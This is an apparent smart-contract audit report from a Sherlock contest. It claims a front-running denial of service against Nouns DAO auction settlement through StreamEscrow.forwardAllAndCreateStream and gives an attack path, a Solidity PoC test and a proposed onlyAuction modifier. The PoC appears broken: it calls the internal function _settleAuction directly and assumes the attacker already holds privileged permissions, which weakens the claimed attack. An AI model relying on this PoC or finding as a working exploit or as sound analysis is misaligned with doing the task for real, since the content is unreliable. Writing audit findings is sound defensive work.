# Malicious actor can DOS auction settlement via frontrunning StreamEscrow.forwardAllAndCreateStream

### Summary

Missing access control in StreamEscrow.forwardAllAndCreateStream allows frontrunning of auction settlement, preventing NFT transfer to winning bidder

https://github.com/sherlock-audit/2024-11-nounsdao/blob/main/nouns-monorepo/packages/nouns-contracts/contracts/StreamEscrow.sol#L113-L115

### Root Cause

In NounsAuctionHouseV3.sol:_settleAuction() calls StreamEscrow.forwardAllAndCreateStream which lacks auction-only access control, allowing frontrunning attacks

### Internal pre-conditions

1. Auction has ended with winning bid
2. Attacker needs to be approved operator or owner of the noun
3. Attacker needs to be in allowedToCreateStream mapping

### External pre-conditions

_No response_

### Attack Path

1. Auction ends with winning bid
2. `_settleAuction()` is called
3. Attacker front-runs the settlement transaction by calling `forwardAllAndCreateStream` with same nounId
4. Original settlement transaction will revert on 'stream active' check
5. Winning bidder cannot receive their NFT

### Impact

The winning bidder cannot receive their NFT, effectively DOSing the auction settlement process and potentially locking funds

### PoC

```solidity
function testFrontrunningAttack() public {
    // Setup
    address attacker = address(0x1);
    uint256 nounId = 1;
    
    // Give attacker required permissions
    streamEscrow.setAllowedToCreateStream(attacker, true);
    nouns.approve(attacker, nounId);
    
    // Auction ends
    // Attacker frontruns settlement
    vm.prank(attacker);
    streamEscrow.forwardAllAndCreateStream{value: 1 ether}(nounId, 5);
    
    // Settlement will revert
    vm.expectRevert("stream active");
    auctionHouse._settleAuction();
}
```

### Mitigation

```solidity
modifier onlyAuction() {
    require(msg.sender == address(auction), "only auction");
    _;
}

function forwardAllAndCreateStream(uint256 nounId, uint16 streamLengthInTicks) 
    external 
    payable 
    onlyAuction 
{
    // ... existing code
}
```
